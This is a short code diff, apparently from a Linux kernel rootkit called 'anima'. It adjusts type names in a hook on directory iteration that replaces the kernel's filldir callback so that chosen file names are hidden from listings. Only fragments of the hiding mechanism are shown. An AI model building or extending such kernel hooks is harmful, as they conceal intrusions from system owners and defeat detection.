@@ -1,6 +1,5 @@
 #include <anima/ksyms.h>
 #include <anima/libc.h>
-#define TMP_INCLUDE_DIRCTX
 #include <anima/vfs.h>
 #include <anima/x86.h>
 
@@ -24,7 +23,7 @@ static int is_name_hidden(const char *name)
 /*
  * for kernel versions >= 3.11
  */
-static filldir_t old_filldir;
+static __filldir_t old_filldir;
 
 static int new_filldir(void *__buf, const char *name, int namlen, loff_t offset,
 			u64 ino, unsigned int d_type)
@@ -38,7 +37,7 @@ static int new_filldir(void *__buf, const char *name, int namlen, loff_t offset,
 
 static void iterate_dir_hook(struct pt_regs *regs)
 {
-	struct dir_context *ctx = (struct dir_context *)regs->si;
+	struct __dir_context *ctx = (struct __dir_context *)regs->si;
 
 	/*
 	 * FIXME: should disable preemption ?
